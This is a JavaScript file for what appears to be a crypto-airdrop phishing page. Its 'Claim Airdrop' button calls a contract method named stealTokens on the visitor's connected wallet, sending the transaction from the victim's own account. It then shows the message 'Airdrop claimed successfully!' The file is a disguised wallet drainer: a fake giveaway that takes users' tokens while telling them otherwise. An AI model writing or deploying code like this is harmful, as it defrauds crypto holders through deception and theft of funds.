// eth.js
// No need to declare web3, contractAddress, or contractABI again

async function claimAirdrop() {
    if (!accounts) {
        alert('Please connect to a wallet first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

window.addEventListener('DOMContentLoaded', (event) => {
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
    loadConfigAndABI('eth');  // Load Ethereum config and ABI
});

